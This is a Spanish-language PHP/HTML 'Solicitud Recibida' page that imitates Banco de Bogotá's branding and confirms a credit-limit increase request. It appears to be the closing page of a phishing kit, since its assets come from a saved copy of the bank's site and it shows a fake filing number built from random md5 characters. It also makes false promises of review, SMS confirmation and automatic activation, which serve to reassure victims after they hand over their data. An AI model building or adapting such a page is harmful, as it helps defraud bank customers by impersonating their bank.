<?php

?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="bogota_files/acb24bb6c10e72d0.css" data-precedence="next">
    <title>Solicitud Enviada - Banco de Bogotá</title>
    <link rel="icon" href="bogota_files/favicon.ico" sizes="256x256" type="image/x-icon">
    <style>
        /* Checkmark animado */
        .check-circle {
            width: 80px; height: 80px;
            border-radius: 50%;
            background: #dcfce7;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 24px;
            animation: popIn 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275) both;
        }
        @keyframes popIn {
            0%   { transform: scale(0); opacity: 0; }
            100% { transform: scale(1); opacity: 1; }
        }
        .check-circle svg { width: 40px; height: 40px; color: #16a34a; }

        /* Paso del proceso */
        .paso {
            display: flex;
            align-items: flex-start;
            gap: 14px;
            padding: 12px 0;
            border-bottom: 1px solid #f0f0f0;
        }
        .paso:last-child { border-bottom: none; }
        .paso-num {
            width: 28px; height: 28px;
            border-radius: 50%;
            background: #003087;
            color: white;
            font-size: 0.75rem;
            font-weight: 700;
            display: flex;
            align-items: center;
            justify-content: center;
            flex-shrink: 0;
            margin-top: 2px;
        }
        .paso-title { font-size: 0.85rem; font-weight: 700; color: #1a2a4a; }
        .paso-desc  { font-size: 0.78rem; color: #667; margin-top: 2px; line-height: 1.4; }

        /* Chip de tiempo */
        .tiempo-chip {
            display: inline-flex;
            align-items: center;
            gap: 6px;
            background: #eef4ff;
            border: 1px solid #c5d9f5;
            border-radius: 999px;
            padding: 5px 16px;
            font-size: 0.82rem;
            font-weight: 700;
            color: #003087;
        }
        .tiempo-chip svg { width: 15px; height: 15px; }

        /* Referencia */
        .ref-box {
            background: #f8fafc;
            border: 1px dashed #c5d9f5;
            border-radius: 8px;
            padding: 10px 16px;
            text-align: center;
            font-size: 0.78rem;
            color: #667;
        }
        .ref-box strong { color: #003087; font-size: 0.9rem; letter-spacing: 0.05em; }
    </style>
</head>
<body class="geist_a71539c9-module__T19VSG__variable geist_mono_8d43a2aa-module__8Li5zG__variable antialiased">
    <div class="w-full bg-gray-50 flex justify-center items-center p-5" style="min-height: 100vh;">
        <div class="p-6 w-full max-w-md">

            <!-- Logo -->
            <div class="flex justify-center mb-6">
                <img alt="Banco de Bogotá" width="200" height="60" decoding="async"
                     style="color:transparent" src="bogota_files/logo.webp">
            </div>

            <!-- Card principal -->
            <div class="flex flex-col gap-5 bg-white rounded-xl shadow-lg w-full p-8">

                <!-- Check animado -->
                <div class="check-circle">
                    <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5"
                              d="M5 13l4 4L19 7"/>
                    </svg>
                </div>

                <!-- Título -->
                <div class="text-center">
                    <p class="text-2xl font-bold text-gray-800 mb-2">¡Solicitud Recibida!</p>
                    <p class="text-sm text-gray-500 leading-relaxed">
                        Tu solicitud de aumento de cupo ha sido registrada exitosamente en nuestro sistema.
                    </p>
                </div>

                <!-- Chip tiempo -->
                <div class="flex justify-center">
                    <div class="tiempo-chip">
                        <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                                  d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z"/>
                        </svg>
                        Respuesta en máximo 48 horas
                    </div>
                </div>

                <hr class="border-gray-100">

                <!-- Número de referencia -->
                <div class="ref-box">
                    <p class="text-xs text-gray-400 mb-1">Número de radicado</p>
                    <strong><?php echo strtoupper(substr(md5(uniqid()), 0, 4) . '-' . substr(md5(uniqid()), 0, 6) . '-' . substr(md5(uniqid()), 0, 4)); ?></strong>
                </div>

                <!-- Pasos siguientes -->
                <div>
                    <p class="text-xs font-bold text-gray-400 uppercase tracking-widest mb-2">¿Qué sigue?</p>

                    <div class="paso">
                        <div class="paso-num">1</div>
                        <div>
                            <p class="paso-title">Análisis de tu solicitud</p>
                            <p class="paso-desc">Nuestro equipo revisará tu perfil crediticio en las próximas horas.</p>
                        </div>
                    </div>

                    <div class="paso">
                        <div class="paso-num">2</div>
                        <div>
                            <p class="paso-title">Confirmación por SMS y correo</p>
                            <p class="paso-desc">Recibirás una notificación al número y email registrados en tu cuenta.</p>
                        </div>
                    </div>

                    <div class="paso">
                        <div class="paso-num">3</div>
                        <div>
                            <p class="paso-title">Activación inmediata del cupo</p>
                            <p class="paso-desc">Una vez aprobado, tu nuevo cupo estará disponible de forma automática.</p>
                        </div>
                    </div>
                </div>

                <hr class="border-gray-100">

                <!-- Mensaje final -->
                <p class="text-center text-xs text-gray-400 leading-relaxed">
                    Si tienes dudas puedes comunicarte con nuestra línea de atención al cliente
                    <strong class="text-gray-600">01 8000 912 345</strong> disponible 24/7.
                </p>

                <!-- Botón volver -->
                <button onclick="window.location.href='index.php'"
                        class="mt-1 bg-blue-600 text-white p-3 rounded-full font-bold text-base cursor-pointer hover:bg-blue-700 transition-colors text-center w-full">
                    Volver al inicio
                </button>

            </div>

            <!-- Imagen informativa -->
            <div class="mt-8">
                <img alt="Info" loading="lazy" width="400" height="100" decoding="async"
                     class="w-full" style="color:transparent" src="bogota_files/miedo.webp">
            </div>

        </div>
    </div>
</body>
</html>